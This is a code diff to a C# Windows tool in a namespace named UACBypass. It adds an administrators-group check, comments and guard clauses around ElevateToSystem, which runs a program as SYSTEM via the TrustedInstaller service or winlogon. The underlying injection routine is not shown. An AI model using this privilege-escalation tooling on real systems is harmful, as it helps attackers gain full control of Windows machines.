@@ -1,8 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Security.Claims;
 using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
@@ -47,6 +49,26 @@ namespace UACBypass
         }
 
         /// <summary>
+        /// The function checks whether the user is a member of administrator's group.
+        /// </summary>
+        /// <returns>
+        /// Returns true if the user is a member of administrator's group.
+        /// </returns>
+        public static bool UserBelongsToAdministratorsGroup()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            if (identity != null)
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                List<Claim> list = new List<Claim>(principal.UserClaims);
+                Claim c = list.Find(p => p.Value.Contains("S-1-5-32-544"));
+                if (c != null)
+                    return true;
+            }
+            return false;
+        }
+
+        /// <summary>
         /// The function check if the given fileName exists.
         /// </summary>
         /// <returns>
@@ -78,6 +100,12 @@ namespace UACBypass
             return null;
         }
 
+        /// <summary>
+        /// The function start the TrustedInstaller's service.
+        /// </summary>
+        /// <returns>
+        /// Returns true if TrustedInstaller's service was started successfully.
+        /// </returns>
         private static bool StartTiService()
 		{
 			try
@@ -92,11 +120,18 @@ namespace UACBypass
 			}
 		}
 
-		public static void ElevateToSystem(string program)
+        /// <summary>
+        /// The function elevate program to systemPrivileges by injecting it in TrustedInstaller or Winlogon.
+        /// </summary>
+        public static void ElevateToSystem(string program)
         {
-			if (Privileges.StartTiService())
+            if (Privileges.IsRunningAsSystem()) throw new Exception("Process already elevated with system privileges");
+            if (!Privileges.IsRunningAsAdmin()) throw new Exception("Unable to elevate rights without administrative privileges");
+            if (!OsSupport.IsVistaOrBetter) throw new Exception("Not supported on old Windows versions (only from Vista)");
+
+            if (OsSupport.IsSevenOrBetter && Privileges.StartTiService())
 				NativeMethods.RunAsSystem("TrustedInstaller", program);
-			else NativeMethods.RunAsSystem("winlogon.exe", program);
+			else NativeMethods.RunAsSystem("winlogon", program);
 		}
 	}
 }
